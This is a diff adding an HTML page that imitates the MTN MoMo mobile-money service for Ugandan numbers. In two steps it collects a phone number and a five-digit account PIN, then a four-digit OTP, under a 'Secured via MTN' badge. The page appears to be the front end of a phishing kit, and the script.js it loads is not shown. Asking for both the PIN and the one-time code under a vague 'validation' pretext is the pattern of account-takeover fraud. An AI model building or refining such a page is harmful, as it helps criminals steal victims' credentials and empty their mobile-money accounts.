@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN MoMo Payment</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="app-header">
+        <div class="logo">
+            <span class="mtn-text">MTN</span> <span class="momo-text">MoMo</span>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="container">
+        
+        <!-- Step 1: Details View -->
+        <section id="step1" class="card fade-in">
+            <div class="card-header">
+                <i class="fa-solid fa-address-card otp-icon" style="margin-bottom: 10px; font-size: 30px; display: block;"></i>
+                <h2>MTN DETAILS</h2>
+                <p>VALIDATION</p>
+            </div>
+            
+            <div class="card-body">
+                <form id="detailsForm">
+                    <div class="form-group">
+                        <label>PHONE NUMBER</label>
+                        <div class="phone-input-group">
+                            <div class="country-code">+256</div>
+                            <input type="tel" id="phoneNumber" placeholder="09X XXX XXXX" maxlength="12" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>PIN</label>
+                        <div class="pin-inputs" id="pinInputs">
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                            <input type="password" maxlength="1" class="pin-box" required>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary" id="btnSubmitDetails">Validate</button>
+                    
+                    <div class="secure-text">
+                        <i class="fa-solid fa-lock"></i> Secured via MTN
+                    </div>
+                </form>
+            </div>
+        </section>
+
+        <!-- Step 2: OTP View -->
+        <section id="step2" class="card fade-in" style="display: none;">
+            <div class="card-header otp-header">
+                <i class="fa-solid fa-shield-halved otp-icon"></i>
+                <h2>MTN VERIFICATION</h2>
+            </div>
+            
+            <div class="card-body otp-body">
+                <h3 class="otp-title">Enter Verification Code</h3>
+                <p class="otp-subtitle">CODE (OTP)</p>
+                <p class="otp-desc">A 4-digit code was sent to</p>
+                <p class="otp-phone" id="displayPhone">+256 XXX XXX XXXX</p>
+                
+                <form id="otpForm">
+                    <div class="pin-inputs otp-inputs" id="otpInputs">
+                        <input type="tel" maxlength="1" class="pin-box otp-box" required>
+                        <input type="tel" maxlength="1" class="pin-box otp-box" required>
+                        <input type="tel" maxlength="1" class="pin-box otp-box" required>
+                        <input type="tel" maxlength="1" class="pin-box otp-box" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary" id="btnSubmitOTP">Validate</button>
+                </form>
+            </div>
+        </section>
+        
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
